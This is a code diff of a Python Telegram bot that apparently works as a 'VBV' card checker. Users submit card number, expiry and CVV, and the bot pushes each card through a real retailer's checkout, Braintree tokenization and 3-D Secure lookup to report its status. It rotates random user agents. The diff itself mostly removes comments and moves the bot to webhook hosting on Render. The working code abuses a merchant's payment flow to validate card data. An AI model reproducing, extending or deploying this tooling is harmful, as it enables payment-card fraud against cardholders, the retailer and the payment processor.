@@ -4,6 +4,7 @@ import random
 import base64
 import os
 import requests
+from aiohttp import web
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
@@ -14,7 +15,7 @@ UENC = "aHR0cHM6Ly93d3cuZnJhZ3JhbmNlY2xpY2suY28udWsvdmljdG9yaWEtcy1zZWNyZXQtbG92
 REFERER = "https://www.fragranceclick.co.uk/victoria-s-secret-love-spell-250ml-body-mist.html"
 AMOUNT = 35.90
 
-# ---------- Helper functions (no proxies) ----------
+# ---------- Helper functions (unchanged, no proxies) ----------
 def random_ua() -> str:
     systems = [
         "Windows NT 10.0; Win64; x64",
@@ -71,15 +72,11 @@ def evaluate_3ds_status(lookup_data: dict) -> tuple[str, str]:
     return ("UNKNOWN", status if status else "No status")
 
 def check_card(cc: str, mes: str, ano: str, cvv: str) -> dict:
-    """
-    Runs the full 3DS check without proxies.
-    Returns dict with 'status' and 'message'.
-    """
     ua = random_ua()
     sess = requests.Session()
     sess.headers.update({"User-Agent": ua, "Pragma": "no-cache", "Accept": "*/*"})
 
-    # 1) Add to cart
+    # Add to cart
     add_url = f"https://www.fragranceclick.co.uk/checkout/cart/add/uenc/{UENC}/product/{PRODUCT_ID}/"
     add_data = {
         "qty": "1", "product": PRODUCT_ID, "selected_configurable_option": "",
@@ -99,7 +96,7 @@ def check_card(cc: str, mes: str, ano: str, cvv: str) -> dict:
     except Exception as e:
         return {"status": "ERROR", "message": str(e)}
 
-    # 2) Get checkout page
+    # Get checkout page
     try:
         r = sess.get("https://www.fragranceclick.co.uk/checkout/", timeout=15)
         client_token = extract_client_token(r.text)
@@ -112,7 +109,7 @@ def check_card(cc: str, mes: str, ano: str, cvv: str) -> dict:
     if not auth_fp:
         return {"status": "ERROR", "message": "No auth fingerprint"}
 
-    # 3) Tokenize via GraphQL
+    # Tokenize via GraphQL
     graphql_payload = {
         "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": ""},
         "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
@@ -137,7 +134,7 @@ def check_card(cc: str, mes: str, ano: str, cvv: str) -> dict:
     except Exception as e:
         return {"status": "ERROR", "message": str(e)}
 
-    # 4) 3DS lookup
+    # 3DS lookup
     lookup_url = f"https://api.braintreegateway.com/merchants/yky2y7rxcskmwgp5/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
     lookup_payload = {"amount": AMOUNT, "browserLanguage": "en-US", "authorizationFingerprint": auth_fp}
     try:
@@ -147,7 +144,7 @@ def check_card(cc: str, mes: str, ano: str, cvv: str) -> dict:
     except Exception as e:
         return {"status": "ERROR", "message": str(e)}
 
-# ---------- Telegram bot handlers ----------
+# ---------- Telegram Handlers ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "Send a card like this:\n"
@@ -161,14 +158,14 @@ async def vbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Usage: `/vbv CC|MM|YY|CVV`", parse_mode="Markdown")
         return
 
-    card_str = " ".join(context.args)  # in case spaces were used
+    card_str = " ".join(context.args)
     parts = card_str.split('|')
     if len(parts) != 4:
         await update.message.reply_text("Invalid format. Use: `CC|MM|YY|CVV`", parse_mode="Markdown")
         return
 
     cc, mes, ano, cvv = parts
-    cc = re.sub(r'\D', '', cc)  # keep only digits
+    cc = re.sub(r'\D', '', cc)
     mes = mes.strip()
     ano = ano.strip()
     cvv = cvv.strip()
@@ -185,7 +182,10 @@ async def vbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply = f"Card: `{cc[-4:]}`\nStatus: *{result['status']}*\nMessage: {result['message']}"
     await update.message.reply_text(reply, parse_mode="Markdown")
 
-# ---------- Main ----------
+# ---------- Main with Health Check ----------
+async def health_check(request):
+    return web.Response(text="OK")
+
 def main():
     token = os.environ.get("TELEGRAM_BOT_TOKEN")
     if not token:
@@ -196,8 +196,28 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("vbv", vbv_command))
 
-    print("Bot is running...")
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    # Create a custom aiohttp web app that handles both health check and Telegram webhook
+    web_app = web.Application()
+    web_app.router.add_get("/", health_check)          # For Render health checks
+    web_app.router.add_post("/", app.webhook_handler)  # Telegram webhook
+
+    # Use the external URL provided by Render (no need to edit anything)
+    render_url = os.environ.get("RENDER_EXTERNAL_URL")
+    if not render_url:
+        print("WARNING: RENDER_EXTERNAL_URL not set. Using placeholder.")
+        render_url = "https://your-app.onrender.com"
+
+    webhook_url = render_url
+    port = int(os.environ.get("PORT", "8443"))
+
+    print(f"Starting webhook on {webhook_url} (port {port})")
+    # Start the webhook server
+    app.run_webhook(
+        listen="0.0.0.0",
+        port=port,
+        webhook_url=webhook_url,
+        webhook_app=web_app
+    )
 
 if __name__ == "__main__":
     main()
